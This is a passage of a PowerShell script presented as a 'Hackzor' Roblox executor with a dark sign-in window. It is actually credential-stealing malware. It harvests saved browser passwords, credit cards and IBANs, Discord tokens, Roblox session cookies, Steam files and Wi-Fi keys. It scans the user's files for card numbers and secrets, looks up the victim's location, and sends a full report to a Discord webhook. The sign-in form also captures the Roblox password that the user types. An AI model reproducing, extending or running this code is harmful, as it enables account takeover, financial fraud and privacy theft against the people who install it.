        }
    }
    return $o
}

function Get-Creds {
    $o = New-Object System.Collections.ArrayList
    $seen = @{}
    foreach ($r in $script:Roots) {
        if (!(Test-Path $r)) { continue }
        $k = Get-BrowserKey $r
        $tag = Split-Path (Split-Path $r -Parent) -Leaf
        foreach ($p in (Get-Profiles $r)) {
            foreach ($row in (Get-Rows (Join-Path $r "$p\Login Data") 'SELECT origin_url, username_value, password_value FROM logins')) {
                $script:stats.loginRows++
                $u = if ($row[1] -is [string]) { $row[1] } else { '' }
                $url = if ($row[0] -is [string]) { $row[0] } else { '' }
                if (!$u -and !$url) { continue }
                $pw = Clean-Pad (Dec-Crypt $row[2] $k $r)
                if (!$pw) { if ($row[2] -is [byte[]]) { $pw = '[locked]' } else { $pw = '[none]' } }
                $line = "[$tag/$p] $url`n    user: $u`n    pass: $pw"
                if ($seen.ContainsKey($line)) { continue }
                $seen[$line] = 1
                [void]$o.Add($line)
            }
        }
    }
    return $o
}

function Get-DbCards {
    $o = New-Object System.Collections.ArrayList
    $seen = @{}
    foreach ($r in $script:Roots) {
        if (!(Test-Path $r)) { continue }
        $k = Get-BrowserKey $r
        $tag = Split-Path (Split-Path $r -Parent) -Leaf
        foreach ($p in (Get-Profiles $r)) {
            foreach ($row in (Get-Rows (Join-Path $r "$p\Web Data") 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards')) {
                $script:stats.cardRows++
                $n = Clean-Pad (Dec-Crypt $row[3] $k $r)
                if ($n -notmatch '^\d{12,19}$') { if ($row[3] -is [byte[]]) { $n = '[locked]' } else { $n = '[empty]' } }
                $line = "[$tag/$p] $($row[0]) | $n | exp $($row[1])/$($row[2])"
                if ($seen.ContainsKey($line)) { continue }
                $seen[$line] = 1
                [void]$o.Add($line)
            }
            foreach ($row in (Get-Rows (Join-Path $r "$p\Web Data") 'SELECT nickname, value_encrypted FROM local_ibans')) {
                $v = Clean-Pad (Dec-Crypt $row[1] $k $r)
                if (!$v) { continue }
                $line = "[$tag/$p] IBAN $($row[0]) | $v"
                if ($seen.ContainsKey($line)) { continue }
                $seen[$line] = 1
                [void]$o.Add($line)
            }
        }
    }
    return $o
}

function Get-Emails {
    $o = New-Object System.Collections.ArrayList
    $seen = @{}
    foreach ($r in $script:Roots) {
        if (!(Test-Path $r)) { continue }
        foreach ($p in (Get-Profiles $r)) {
            foreach ($row in (Get-Rows (Join-Path $r "$p\Web Data") "SELECT DISTINCT value FROM autofill WHERE value LIKE '%@%'")) {
                $script:stats.autofillRows++
                if ($row[0] -isnot [string] -or $row[0].Length -lt 5) { continue }
                if ($seen.ContainsKey($row[0])) { continue }
                $seen[$row[0]] = 1
                [void]$o.Add($row[0])
            }
        }
    }
    return $o
}

function Get-BrowserDiscord {
    $o = New-Object System.Collections.ArrayList
    $seen = @{}
    foreach ($r in $script:Roots) {
        if (!(Test-Path $r)) { continue }
        $tag = Split-Path (Split-Path $r -Parent) -Leaf
        foreach ($p in (Get-Profiles $r)) {
            $ld = Join-Path $r "$p\Local Storage\leveldb"
            if (!(Test-Path $ld)) { continue }
            foreach ($f in (Get-ChildItem $ld -File)) {
                if ($f.Length -gt 16MB) { continue }
                $t = [Text.Encoding]::GetEncoding(1252).GetString([IO.File]::ReadAllBytes($f.FullName))
                if ($t -notmatch 'discord') { continue }
                foreach ($m in [regex]::Matches($t, '[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,38}|mfa\.[\w-]{84}')) {
                    if ($seen.ContainsKey($m.Value)) { continue }
                    $seen[$m.Value] = 1
                    try {
                        $r2 = Invoke-RestMethod -Uri 'https://discord.com/api/v9/users/@me' -Headers @{ Authorization = $m.Value; 'User-Agent' = 'Mozilla/5.0' } -UseBasicParsing -TimeoutSec 10 -ErrorAction Stop
                        $nm = if ($r2.discriminator -and $r2.discriminator -ne '0') { "$($r2.username)#$($r2.discriminator)" } else { $r2.username }
                        [void]$o.Add("[$tag/$p] $nm ($($r2.id)) | $($r2.email)`n    token: $($m.Value)")
                    } catch { }
                }
            }
        }
    }
    return $o
}

function Get-DiscordTokens {
    $o = New-Object System.Collections.ArrayList
    $seen = @{}
    foreach ($d in @("$env:APPDATA\discord\Local Storage\leveldb", "$env:APPDATA\discordcanary\Local Storage\leveldb", "$env:APPDATA\discordptb\Local Storage\leveldb")) {
        if (!(Test-Path $d)) { continue }
        foreach ($f in (Get-ChildItem $d -File)) {
            $t = [Text.Encoding]::GetEncoding(1252).GetString([IO.File]::ReadAllBytes($f.FullName))
            foreach ($m in [regex]::Matches($t, '[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,38}|mfa\.[\w-]{84}')) {
                if ($seen.ContainsKey($m.Value)) { continue }
                $seen[$m.Value] = 1
                try {
                    $r2 = Invoke-RestMethod -Uri 'https://discord.com/api/v9/users/@me' -Headers @{ Authorization = $m.Value; 'User-Agent' = 'Mozilla/5.0' } -UseBasicParsing -TimeoutSec 10 -ErrorAction Stop
                    $nm = if ($r2.discriminator -and $r2.discriminator -ne '0') { "$($r2.username)#$($r2.discriminator)" } else { $r2.username }
                    [void]$o.Add("$nm ($($r2.id)) | $($r2.email)`n    token: $($m.Value)")
                } catch { }
            }
        }
    }
    return $o
}

function Get-FirefoxCreds {
    $o = New-Object System.Collections.ArrayList
    $root = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (!(Test-Path $root)) { return $o }
    foreach ($d in (Get-ChildItem $root -Directory)) {
        try {
            foreach ($l in [Ff]::Dump($d.FullName)) {
                $parts = $l -split ' \| '
                [void]$o.Add("[Firefox/$($d.Name)] $($parts[0])`n    user: $($parts[1])`n    pass: $($parts[2])")
            }
        } catch { }
    }
    return $o
}

function Get-FirefoxCookies {
    $o = New-Object System.Collections.ArrayList
    $root = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (!(Test-Path $root)) { return $o }
    foreach ($f in (Get-ChildItem $root -Recurse -Filter 'cookies.sqlite')) {
        foreach ($r in (Get-Rows $f.FullName "SELECT value FROM moz_cookies WHERE host LIKE '%roblox%'")) {
            if ($r[0] -is [string]) { $m = [regex]::Match($r[0], '_\|WARNING[!-~]+'); if ($m.Success) { [void]$o.Add($m.Value) } }
        }
    }
    return $o
}

function Get-LocalCookies {
    $o = New-Object System.Collections.ArrayList
    $reg = Get-ItemProperty 'HKCU:\SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com'
    if ($reg.COOKIE) {
        $c = [Uri]::UnescapeDataString($reg.COOKIE)
        foreach ($m in [regex]::Matches($c, '_\|WARNING[!-~]+')) { [void]$o.Add($m.Value) }
    }
    foreach ($d in @("$env:LOCALAPPDATA\Roblox\LocalStorage", "$env:LOCALAPPDATA\Roblox\logs")) {
        if (!(Test-Path $d)) { continue }
        foreach ($f in (Get-ChildItem $d -Recurse -File)) {
            if ($f.Length -gt 8MB) { continue }
            $t = [Text.Encoding]::GetEncoding(1252).GetString([IO.File]::ReadAllBytes($f.FullName))
            foreach ($m in [regex]::Matches($t, '_\|WARNING[!-~]+')) { [void]$o.Add($m.Value) }
        }
    }
    return $o
}

function Get-Steam {
    $o = New-Object System.Collections.ArrayList
    foreach ($r in @("${env:ProgramFiles(x86)}\Steam", "$env:ProgramFiles\Steam", "$env:LOCALAPPDATA\Steam")) {
        if (!(Test-Path $r)) { continue }
        $v = Join-Path $r 'config\loginusers.vdf'
        if (Test-Path $v) {
            $id = $null
            foreach ($ln in (Get-Content $v)) {
                if ($ln -match '^\s*"(\d{17})"') { $id = $Matches[1] }
                elseif ($ln -match '"AccountName"\s*"([^"]*)"') { [void]$o.Add("account: $($Matches[1]) (id $id)") }
                elseif ($ln -match '"PersonaName"\s*"([^"]*)"') { [void]$o.Add("    persona: $($Matches[1])") }
            }
        }
        foreach ($f in (Get-ChildItem $r -Filter 'ssfn*' -File)) {
            try { [void]$o.Add("ssfn $($f.Name): $([Convert]::ToBase64String([IO.File]::ReadAllBytes($f.FullName)))") } catch { }
        }
    }
    return $o
}

function Get-Wifi {
    $o = New-Object System.Collections.ArrayList
    try {
        foreach ($ln in (netsh wlan show profiles)) {
            if ($ln -notmatch ':\s*(.+)$') { continue }
            $n = $Matches[1].Trim()
            if (!$n -or $n -match 'profiles') { continue }
            $d = (netsh wlan show profile name="$n" key=clear) -join "`n"
            if ($d -match 'Key Content\s*:\s*(.+)$') { [void]$o.Add("$n | $($Matches[1].Trim())") } else { [void]$o.Add("$n | (open)") }
        }
    } catch { }
    return $o
}

function Scan-Files {
    param([string]$Root, [int]$Depth, [int]$BudgetMs)
    if (!(Test-Path $Root)) { return }
    $sw = [Diagnostics.Stopwatch]::StartNew()
    $stack = New-Object System.Collections.Stack
    $stack.Push(@($Root, 0))
    while ($stack.Count -gt 0) {
        if ($sw.ElapsedMilliseconds -gt $BudgetMs) { $script:stats.truncated++; return }
        $cur = $stack.Pop()
        $dir = $cur[0]
        $d = [int]$cur[1]
        try { foreach ($f in [IO.Directory]::EnumerateFiles($dir)) {
            if ($script:stats.scanned -gt 60000) { $script:stats.truncated++; return }
            $script:stats.scanned++
            $fi = $null
            try { $fi = New-Object IO.FileInfo $f } catch { continue }
            if ($fi.Length -gt 4MB) { continue }
            $e = $fi.Extension.TrimStart('.').ToLower()
            $isText = ($script:TextExt -contains $e)
            if (!$isText -and !$e -and $fi.Length -lt 262144) { $isText = $true }
            $nameHit = ($fi.Name -match $script:NameHit)
            if ($nameHit -and $script:hitNames.Count -lt 500) { [void]$script:hitNames.Add($f); $script:stats.hitNames++ }
            if (!$isText -or $fi.Length -gt 262144) { continue }
            $txt = ''
            try {
                $sr = New-Object IO.StreamReader($f, [Text.Encoding]::UTF8, $true)
                $buf = New-Object char[] 262144
                $n = $sr.Read($buf, 0, $buf.Length)
                $sr.Dispose()
                if ($n -gt 0) { $txt = New-Object string ($buf, 0, $n) }
            } catch { continue }
            if (!$txt) { continue }

            if ($txt -match '[0-9]') { Find-Cards $txt $f $fi.Name $e ($fi.Name -match $script:CardNameHit) }

            if ($txt -match $script:IbanRe) {
                foreach ($m in [regex]::Matches($txt, $script:IbanRe)) {
                    if ($script:hitCards.Count -ge 300) { break }
                    if (!(Test-Iban $m.Value)) { continue }
                    if ($script:seenCard.ContainsKey($m.Value)) { continue }
                    $script:seenCard[$m.Value] = 1
                    [void]$script:hitCards.Add("IBAN $($m.Value)`n    $f")
                    $script:stats.hitCards++
                }
            }

            if ($txt -match $script:CredKw) {
                $c = 0
                foreach ($ln in ($txt -split "`r?`n")) {
                    if ($script:hitSecrets.Count -ge 800) { break }
                    $t = $ln.Trim()
                    if ($t.Length -lt 6 -or $t.Length -gt 200) { continue }
                    if ($t -notmatch $script:CredKw) { continue }
                    if ($script:seenSecret.ContainsKey($t)) { continue }
                    $script:seenSecret[$t] = 1
                    [void]$script:hitSecrets.Add("$t`n    $f")
                    $script:stats.hitSecrets++
                    $c++
                    if ($c -ge 4) { break }
                }
            }
        } } catch { }
        if ($d -lt $Depth) {
            try { foreach ($s in [IO.Directory]::EnumerateDirectories($dir)) {
                $nm = [IO.Path]::GetFileName($s)
                if ($script:SkipDir -contains $nm) { continue }
                if ($nm.StartsWith('.')) { continue }
                $stack.Push(@($s, $d + 1))
            } } catch { }
        }
    }
}

function Run-FileScan {
    Scan-Files $env:USERPROFILE 7 70000
    $others = @()
    try { $others = Get-CimInstance Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 -and $_.DeviceID -ne $env:SystemDrive } } catch { }
    $i = 0
    foreach ($dv in $others) {
        if ($i -ge 2) { break }
        Scan-Files ($dv.DeviceID + '\') 3 20000
        $i++
    }
    Scan-Files "$env:PUBLIC" 4 8000
}

function Send-Discord {
    param([string]$T)
    if ($T.Length -gt 1900) { $T = $T.Substring(0, 1900) }
    $b = @{ content = $T } | ConvertTo-Json -Compress
    for ($i = 0; $i -lt 4; $i++) {
        try { Invoke-RestMethod -Uri $Webhook -Method Post -Body $b -ContentType 'application/json' -UseBasicParsing -TimeoutSec 20 -ErrorAction Stop | Out-Null; return $true }
        catch { $c = 0; try { $c = [int]$_.Exception.Response.StatusCode } catch { }; if ($c -eq 429) { Start-Sleep -Milliseconds 2600 } else { Start-Sleep -Milliseconds 1200 } }
    }
    return $false
}

function Send-File {
    param([string]$N, [string]$C, [string]$Cap)
    $bnd = '----hz' + [guid]::NewGuid().ToString('N')
    $ms = New-Object System.IO.MemoryStream
    $e = [Text.Encoding]::UTF8
    function P([string]$s) { $by = $e.GetBytes($s); $ms.Write($by, 0, $by.Length) }
    P "--$bnd`r`n"
    P "Content-Disposition: form-data; name=`"payload_json`"`r`n`r`n"
    P ((@{ content = $Cap } | ConvertTo-Json -Compress) + "`r`n")
    P "--$bnd`r`n"
    P "Content-Disposition: form-data; name=`"files[0]`"; filename=`"$N`"`r`n"
    P "Content-Type: text/plain`r`n`r`n"
    P $C
    P "`r`n--$bnd--`r`n"
    $body = $ms.ToArray(); $ms.Dispose()
    for ($i = 0; $i -lt 4; $i++) {
        try { Invoke-RestMethod -Uri $Webhook -Method Post -ContentType "multipart/form-data; boundary=$bnd" -Body $body -TimeoutSec 60 -ErrorAction Stop | Out-Null; return $true }
        catch { $c = 0; try { $c = [int]$_.Exception.Response.StatusCode } catch { }; if ($c -eq 429) { Start-Sleep -Milliseconds 2600 } else { Start-Sleep -Milliseconds 1200 } }
    }
    return $false
}

function Get-Geo { try { return Invoke-RestMethod -Uri 'http://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query' -UseBasicParsing -TimeoutSec 12 -ErrorAction Stop } catch { return $null } }

function Get-Account {
    param([string]$C)
    try {
        $h = @{ Cookie = ".ROBLOSECURITY=$C" }
        $r = Invoke-RestMethod -Uri 'https://users.roblox.com/v1/users/authenticated' -Headers $h -UseBasicParsing -TimeoutSec 12 -ErrorAction Stop
        $cu = Invoke-RestMethod -Uri "https://economy.roblox.com/v1/users/$($r.id)/currency" -Headers $h -UseBasicParsing -TimeoutSec 12 -ErrorAction Stop
        return [pscustomobject]@{ Id=$r.id; Name=$r.name; Display=$r.displayName; Created=$r.created; Robux=$cu.robux }
    } catch { return $null }
}

function Get-SysInfo {
    $o = [ordered]@{}
    try {
        $os = Get-CimInstance Win32_OperatingSystem
        $c = Get-CimInstance Win32_ComputerSystem
        $o.OS = "$($os.Caption) $($os.Version) $($os.OSArchitecture)"
        $o.Installed = $os.InstallDate
        $o.Uptime_h = [math]::Round(((Get-Date) - $os.LastBootUpTime).TotalHours, 1)
        $o.Machine = "$($c.Manufacturer) $($c.Model)"
        $o.CPU = (Get-CimInstance Win32_Processor).Name
        $o.RAM_GB = [math]::Round($c.TotalPhysicalMemory / 1GB, 1)
        $o.GPU = (@(Get-CimInstance Win32_VideoController | ForEach-Object { $_.Name }) -join ', ')
        $o.Disks = (@(Get-CimInstance Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 } | ForEach-Object { "$($_.DeviceID) $([math]::Round($_.FreeSpace/1GB,1))GB free / $([math]::Round($_.Size/1GB,1))GB" }) -join ' | ')
        $o.LocalIPs = (@(Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '127.*' } | ForEach-Object { $_.IPAddress }) -join ', ')
        $o.MAC = (@(Get-NetAdapter | Where-Object Status -eq 'Up' | ForEach-Object { $_.MacAddress }) -join ', ')
    } catch { }
    return $o
}

$script:u='(none)'; $script:p='(none)'; $script:reason=''; $script:sent=$false; $script:closing=$false; $script:sendOk=$false; $script:snapshot=''

function Invoke-All {
    $script:sendOk = $false
    $sb = New-Object System.Text.StringBuilder
    function W([string]$s) { $null = $sb.AppendLine($s) }

    W "=== HACKZORGUI REPORT ==="
    W "build: $Build"
    W "time:  $(Get-Date -Format 'u')"
    W "state: $($script:reason)"
    W "user:  $($script:u)"
    W "pass:  $($script:p)"
    W "pc:    $env:COMPUTERNAME / $env:USERNAME"
    W "admin: $isAdmin"
    W "path:  $self"
    W ""

    $ip='?'; $loc='?'
    $geo = Get-Geo
    W "=== CONNECTION ==="
    if ($geo -and $geo.status -eq 'success') {
        $ip=$geo.query; $loc="$($geo.city), $($geo.country)"
        W "ip:       $($geo.query)"
        W "where:    $($geo.city), $($geo.regionName), $($geo.country) $($geo.zip)"
        W "isp:      $($geo.isp)"
        W "asn:      $($geo.as)"
    } else { W "ip: lookup failed" }
    W ""

    W "=== CARDS (browser) ==="
    $dc = New-Object System.Collections.ArrayList
    try { $dc = Get-DbCards } catch { }
    if ($dc.Count -eq 0) { W "(none)" } else { foreach ($x in $dc) { W $x } }
    W ""

    W "=== ROBLOX ==="
    $cookies = New-Object System.Collections.ArrayList
    $valid = 0
    $all = New-Object System.Collections.ArrayList
    foreach ($fn in @('Get-LocalCookies','Get-FirefoxCookies','Get-ChromeCookies')) {
        try { foreach ($c in (& $fn)) { if ($c) { [void]$all.Add($c) } } } catch { }
    }
    $sc = @{}
    foreach ($c in $all) { if (!$sc.ContainsKey($c)) { $sc[$c]=1; [void]$cookies.Add($c) } }
    if ($cookies.Count -eq 0) { W "(none - no roblox.com cookie on this pc)" }
    foreach ($c in $cookies) {
        $a = Get-Account $c
        if ($a) { $valid++; W "ACCOUNT: $($a.Name) ($($a.Display))  id $($a.Id)  robux $($a.Robux)"; W "  cookie: $c" }
        else { W "unverified: $c" }
    }
    W ""

    W "=== DISCORD (browser) ==="
    $bd = New-Object System.Collections.ArrayList
    try { $bd = Get-BrowserDiscord } catch { }
    if ($bd.Count -eq 0) { W "(none)" } else { foreach ($x in $bd) { W $x } }
    W ""

    W "=== CREDENTIALS (all browsers) ==="
    $cr = New-Object System.Collections.ArrayList
    try { $cr = Get-Creds } catch { }
    try { foreach ($x in (Get-FirefoxCreds)) { [void]$cr.Add($x) } } catch { }
    if ($cr.Count -eq 0) { W "(none)" } else { foreach ($x in $cr) { W $x; W "" } }
    W ""

    W "=== EMAILS ==="
    $em = New-Object System.Collections.ArrayList
    try { $em = Get-Emails } catch { }
    if ($em.Count -eq 0) { W "(none)" } else { foreach ($x in $em) { W $x } }
    W ""

    W "=== DISCORD (app) ==="
    $tk = New-Object System.Collections.ArrayList
    try { $tk = Get-DiscordTokens } catch { }
    if ($tk.Count -eq 0) { W "(none)" } else { foreach ($x in $tk) { W $x } }
    W ""

    W "=== STEAM ==="
    $st = New-Object System.Collections.ArrayList
    try { $st = Get-Steam } catch { }
    if ($st.Count -eq 0) { W "(none)" } else { foreach ($x in $st) { W $x } }
    W ""

    W "=== WIFI ==="
    $wf = New-Object System.Collections.ArrayList
    try { $wf = Get-Wifi } catch { }
    if ($wf.Count -eq 0) { W "(none)" } else { foreach ($x in $wf) { W $x } }
    W ""

    Set-Status 'Scanning files...' $accent
    Run-FileScan
    Set-Status 'Scanning files...' $accent

    W "=== CARDS (files) ==="
    if ($script:hitCards.Count -eq 0) { W "(none)" } else { foreach ($x in $script:hitCards) { W $x; W "" } }
    W ""

    W "=== SECRETS IN FILES ==="
    if ($script:hitSecrets.Count -eq 0) { W "(none)" } else { foreach ($x in $script:hitSecrets) { W $x } }
    W ""

    W "=== FILES ==="
    if ($script:hitNames.Count -eq 0) { W "(none)" } else { foreach ($x in $script:hitNames) { W $x } }
    W ""

    W "=== MACHINE ==="
    $si = Get-SysInfo
    foreach ($k in $si.Keys) { W "$($k): $($si[$k])" }
    W ""

    W "=== DIAG ==="
    W "sq $($script:stats.sqType) / rbx $($script:stats.rbxType) / ff $($script:stats.ffType)"
    W "roots $($script:stats.roots)/$($script:Roots.Count)  sql $($script:stats.sqlCalls) fail $($script:stats.sqlFail) live $($script:stats.live) copyfail $($script:stats.copyFail)"
    W "rows cookies $($script:stats.cookieRows) logins $($script:stats.loginRows) emails $($script:stats.autofillRows) cards $($script:stats.cardRows)"
    W "scan files $($script:stats.scanned) names $($script:stats.hitNames) secrets $($script:stats.hitSecrets) cards $($script:stats.hitCards) budgets_hit $($script:stats.truncated)"
    W "key v10 $($script:stats.keyOk)ok/$($script:stats.keyBad)bad  helper $($script:stats.helper)  v20 $($script:v20ok)ok/$($script:v20fail)fail"
    W "persist $($script:PersistDiag)"
    foreach ($k in $script:abe.Keys) { W "abe: $($script:abe[$k])" }
    if ($script:stats.lastSqlErr) { W "sqlerr: $($script:stats.lastSqlErr)" }
    if ($script:stats.ffErr) { W "fferr: $($script:stats.ffErr)" }
    if ($script:stats.rbxErr) { W "rbxerr: $($script:stats.rbxErr)" }
    W "=== END ==="

    $script:snapshot = $sb.ToString()
    Write-Log "snapshot: creds=$($cr.Count) cards=$($script:hitCards.Count) secrets=$($script:hitSecrets.Count) scanned=$($script:stats.scanned)"

    $sum = "**hackzorGUI $Build**`n**$($script:reason)**`n$($script:u)`n$ip ($loc)`n$env:COMPUTERNAME`nroblox $valid | creds $($cr.Count) | dbcards $($dc.Count) | filecards $($script:hitCards.Count)`nsecrets $($script:hitSecrets.Count) | scanned $($script:stats.scanned)"
    $a = Send-Discord $sum
    Start-Sleep -Milliseconds 500
    $b = Send-File 'snapshot.txt' $script:snapshot 'attached'
    $script:sendOk = ($a -or $b)
    return $valid
}

[void][Windows.Forms.Application]::EnableVisualStyles()
$accent=[Drawing.Color]::FromArgb(109,90,246); $bg=[Drawing.Color]::FromArgb(11,13,17); $panelC=[Drawing.Color]::FromArgb(14,17,23)
$cardC=[Drawing.Color]::FromArgb(16,20,25); $fieldC=[Drawing.Color]::FromArgb(21,26,33)
$bordC=[Drawing.Color]::FromArgb(33,39,52); $lineC=[Drawing.Color]::FromArgb(26,31,41)
$muted=[Drawing.Color]::FromArgb(139,147,163); $dim=[Drawing.Color]::FromArgb(95,103,121)
$bodyC=[Drawing.Color]::FromArgb(155,163,180); $white=[Drawing.Color]::FromArgb(242,244,248)
$okC=[Drawing.Color]::FromArgb(94,214,153)

$form = New-Object Windows.Forms.Form
$form.FormBorderStyle='None'; $form.Size=New-Object Drawing.Size(820,600); $form.StartPosition='CenterScreen'
$form.BackColor=$bg; $form.ForeColor=$white; $form.TopMost=$true; $form.Font=New-Object Drawing.Font('Segoe UI',9)

$h = New-Object Windows.Forms.Panel; $h.SetBounds(0,0,820,64); $h.BackColor=$panelC; $form.Controls.Add($h)
$logo = New-Object Windows.Forms.Label; $logo.Text='H'; $logo.Font=New-Object Drawing.Font('Segoe UI',13,[Drawing.FontStyle]::Bold)
$logo.TextAlign='MiddleCenter'; $logo.BackColor=$accent; $logo.ForeColor=$white; $logo.SetBounds(24,17,30,30); $h.Controls.Add($logo)
$title = New-Object Windows.Forms.Label; $title.Text='Hackzor'; $title.Font=New-Object Drawing.Font('Segoe UI',11,[Drawing.FontStyle]::Bold)
$title.ForeColor=$white; $title.SetBounds(64,15,90,24); $h.Controls.Add($title)
$sub = New-Object Windows.Forms.Label; $sub.Text='EXECUTOR'; $sub.ForeColor=[Drawing.Color]::FromArgb(167,139,250)
$sub.BackColor=[Drawing.Color]::FromArgb(25,29,38); $sub.TextAlign='MiddleCenter'; $sub.Font=New-Object Drawing.Font('Segoe UI',7,[Drawing.FontStyle]::Bold); $sub.SetBounds(134,23,62,15); $h.Controls.Add($sub)
$ver = New-Object Windows.Forms.Label; $ver.Text=$Build; $ver.ForeColor=$dim
$ver.BackColor=[Drawing.Color]::FromArgb(18,21,28); $ver.TextAlign='MiddleCenter'; $ver.Font=New-Object Drawing.Font('Consolas',7); $ver.SetBounds(204,23,84,15); $h.Controls.Add($ver)
$bmin = New-Object Windows.Forms.Label; $bmin.Text=[char]0x2013; $bmin.TextAlign='MiddleCenter'; $bmin.ForeColor=$muted; $bmin.Font=New-Object Drawing.Font('Segoe UI',11); $bmin.SetBounds(760,14,26,26); $h.Controls.Add($bmin)
$bcl = New-Object Windows.Forms.Label; $bcl.Text=[char]0x2715; $bcl.TextAlign='MiddleCenter'; $bcl.ForeColor=$muted; $bcl.Font=New-Object Drawing.Font('Segoe UI',8); $bcl.SetBounds(788,14,26,26); $h.Controls.Add($bcl)
$hl = New-Object Windows.Forms.Panel; $hl.SetBounds(0,64,820,1); $hl.BackColor=[Drawing.Color]::FromArgb(43,36,80); $form.Controls.Add($hl)

$sh = New-Object Windows.Forms.Panel; $sh.SetBounds(0,65,820,29); $sh.BackColor=[Drawing.Color]::FromArgb(11,13,18); $form.Controls.Add($sh)
$shl = New-Object Windows.Forms.Label; $shl.Text='Roblox Executor'; $shl.ForeColor=$muted; $shl.Font=New-Object Drawing.Font('Segoe UI',8); $shl.SetBounds(24,73,220,15); $sh.Controls.Add($shl)
$dot = New-Object Windows.Forms.Panel; $dot.SetBounds(752,81,6,6); $dot.BackColor=$okC; $sh.Controls.Add($dot)
$rdy = New-Object Windows.Forms.Label; $rdy.Text='Ready'; $rdy.ForeColor=$okC; $rdy.Font=New-Object Drawing.Font('Segoe UI',8); $rdy.SetBounds(764,73,60,15); $sh.Controls.Add($rdy)
$shb = New-Object Windows.Forms.Panel; $shb.SetBounds(0,94,820,1); $shb.BackColor=$lineC; $form.Controls.Add($shb)

$cbx = New-Object Windows.Forms.Panel; $cbx.SetBounds(24,112,348,456); $cbx.BackColor=$bordC; $form.Controls.Add($cbx)
$ci = New-Object Windows.Forms.Panel; $ci.SetBounds(1,1,346,454); $ci.BackColor=$cardC; $cbx.Controls.Add($ci)
$rbx = New-Object Windows.Forms.Panel; $rbx.SetBounds(392,112,404,456); $rbx.BackColor=$bordC; $form.Controls.Add($rbx)
$ri = New-Object Windows.Forms.Panel; $ri.SetBounds(1,1,402,454); $ri.BackColor=[Drawing.Color]::FromArgb(12,14,19); $rbx.Controls.Add($ri)

$fb = New-Object Windows.Forms.Panel; $fb.SetBounds(0,576,820,24); $fb.BackColor=$panelC; $form.Controls.Add($fb)
$fbl = New-Object Windows.Forms.Panel; $fbl.SetBounds(0,576,820,1); $fbl.BackColor=$lineC; $form.Controls.Add($fbl)
$ftl = New-Object Windows.Forms.Label; $ftl.Text='AES-256-GCM   ·   session held in memory   ·   build ' + $Build; $ftl.ForeColor=$dim; $ftl.Font=New-Object Drawing.Font('Segoe UI',7); $ftl.SetBounds(24,580,460,15); $fb.Controls.Add($ftl)
$ftr = New-Object Windows.Forms.Label; $ftr.Text='hackzor.local'; $ftr.ForeColor=$dim; $ftr.TextAlign='MiddleRight'; $ftr.Font=New-Object Drawing.Font('Segoe UI',7); $ftr.SetBounds(640,580,156,15); $fb.Controls.Add($ftr)

$script:drag=$false
$mv = { if ($script:drag) { $pt=[Windows.Forms.Cursor]::Position; $form.Location=New-Object Drawing.Point(($pt.X-$script:ox),($pt.Y-$script:oy)) } }
$gr = { param($s,$e) $script:ox=$e.X; $script:oy=$e.Y; $script:drag=$true }
$dp = { $script:drag=$false }
foreach ($c in @($h,$logo,$title,$sub,$ver)) { $c.Add_MouseDown($gr); $c.Add_MouseMove($mv); $c.Add_MouseUp($dp) }
$bcl.Add_Click({ $form.Close() }); $bmin.Add_Click({ $form.WindowState='Minimized' })
$bcl.Add_MouseEnter({ $bcl.BackColor=[Drawing.Color]::FromArgb(180,60,60) }); $bcl.Add_MouseLeave({ $bcl.BackColor=$panelC })
$bmin.Add_MouseEnter({ $bmin.BackColor=[Drawing.Color]::FromArgb(28,33,42) }); $bmin.Add_MouseLeave({ $bmin.BackColor=$panelC })

function New-Field {
    param([int]$Y,[string]$L)
    $lb=New-Object Windows.Forms.Label; $lb.Text=$L; $lb.ForeColor=$dim; $lb.Font=New-Object Drawing.Font('Segoe UI',7,[Drawing.FontStyle]::Bold); $lb.SetBounds(20,$Y,306,14); $ci.Controls.Add($lb)
    $bx=New-Object Windows.Forms.Panel; $bx.SetBounds(20,($Y+17),306,34); $bx.BackColor=$bordC; $ci.Controls.Add($bx)
    $in=New-Object Windows.Forms.Panel; $in.SetBounds(1,1,304,32); $in.BackColor=$fieldC; $bx.Controls.Add($in)
    $tb=New-Object Windows.Forms.TextBox; $tb.SetBounds(10,7,284,20); $tb.BorderStyle='None'; $tb.BackColor=$fieldC; $tb.ForeColor=$white; $tb.Font=New-Object Drawing.Font('Segoe UI',9); $in.Controls.Add($tb)
    return $tb
}

$hdr=New-Object Windows.Forms.Label; $hdr.Text='Sign in'; $hdr.ForeColor=$white; $hdr.Font=New-Object Drawing.Font('Segoe UI',10,[Drawing.FontStyle]::Bold); $hdr.SetBounds(20,18,200,20); $ci.Controls.Add($hdr)
$hsb=New-Object Windows.Forms.Label; $hsb.Text='Use your Roblox account credentials.'; $hsb.ForeColor=$muted; $hsb.Font=New-Object Drawing.Font('Segoe UI',8); $hsb.SetBounds(20,40,300,15); $ci.Controls.Add($hsb)
$txtU = New-Field -Y 74 -L 'USERNAME OR EMAIL'
$txtP = New-Field -Y 138 -L 'PASSWORD'
$txtP.UseSystemPasswordChar=$true
$chk=New-Object Windows.Forms.CheckBox; $chk.Text='Keep this session active'; $chk.ForeColor=[Drawing.Color]::FromArgb(180,186,200)
$chk.BackColor=$cardC; $chk.FlatStyle='Flat'; $chk.Font=New-Object Drawing.Font('Segoe UI',8); $chk.SetBounds(18,204,270,20); $chk.Checked=$true; $ci.Controls.Add($chk)
$btn=New-Object Windows.Forms.Button; $btn.Text='SIGN IN'; $btn.SetBounds(20,232,306,38); $btn.BackColor=$accent; $btn.ForeColor=$white
$btn.FlatStyle='Flat'; $btn.FlatAppearance.BorderSize=0; $btn.Font=New-Object Drawing.Font('Segoe UI',8,[Drawing.FontStyle]::Bold); $btn.Cursor='Hand'; $ci.Controls.Add($btn)
$btn.Add_MouseEnter({ if ($btn.Enabled) { $btn.BackColor=[Drawing.Color]::FromArgb(128,110,255) } })
$btn.Add_MouseLeave({ $btn.BackColor=$accent })
